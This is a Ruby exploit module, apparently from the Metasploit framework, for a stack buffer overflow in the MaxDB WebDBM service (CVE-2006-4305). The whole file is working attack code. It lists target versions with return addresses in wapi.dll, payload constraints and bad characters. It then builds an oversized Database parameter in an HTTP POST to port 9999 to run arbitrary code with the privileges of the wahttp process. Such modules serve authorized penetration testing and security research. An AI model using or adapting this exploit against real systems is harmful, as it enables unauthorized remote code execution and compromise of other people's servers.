require 'msf/core'

module Msf

class Exploits::Windows::Http::Maxdb_Webdbm_Dbname_Overflow < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'MaxDB WebDBM Database Parameter Overflow',
			'Description'    => %q{
				This module exploits a stack overflow in the MaxDB WebDBM	
				service. By sending a specially-crafted HTTP request that contains
				an overly long database name. A remote attacker could overflow a buffer 
				and execute arbitrary code on the system with privileges of the wahttp process.

				This module has been tested against MaxDB 7.6.00.16 and MaxDB 7.6.00.27.	
			},
			'Author'         => [ 'MC' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 3583 $',
			'References'     =>
				[
	  				['OSVDB', '28300'],
					['BID', '19660'],
					['CVE', '2006-4305'],
				],
			'DefaultOptions' =>
			{
				'EXITFUNC' => 'thread',
			},

			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 400,
					'BadChars' => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x40",
					'PrependEncoder' => "\x81\xc4\xff\xef\xff\xff\x44",
				},
			'Platform'       => 'win',
			'Targets'        => 
				[
					[ 'MaxDB 7.6.00.16', { 'Ret' => 0x1005a08f } ], # wapi.dll
					[ 'MaxDB 7.6.00.27', { 'Ret' => 0x1005b08f } ], # wapi.dll
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Aug 29 2006'))
			
			register_options( [ Opt::RPORT(9999) ], self.class )

	end

	def exploit
		connect

		server = Rex::Text.rand_text_english(5, payload_badchars)
		user   = Rex::Text.rand_text_english(5, payload_badchars)
		pass   = Rex::Text.rand_text_english(5, payload_badchars)
		port   = rand(65535).to_s

		sploit =  Rex::Text.rand_text_alphanumeric(91, payload_badchars) + [target.ret].pack('V')
		sploit << payload.encoded

		req    =  "Event=DBM_LOGON&Action=LOGON&Server=#{server}&Database=#{sploit}"
		req    << "&User=#{user}&Password=#{pass}"

		res    =  "POST /webdbm HTTP/1.1\r\n" + "Host: #{rhost}:#{port}\r\n"  
		res    << "Content-Length: #{req.length}" + "\r\n\r\n" + req + "\r\n"

		print_status("Trying target %s..." % target.name)

		sock.put(res)

		#give wahttp.exe a bit to recover...
		sleep 2

		handler
		disconnect
	end

end
end	
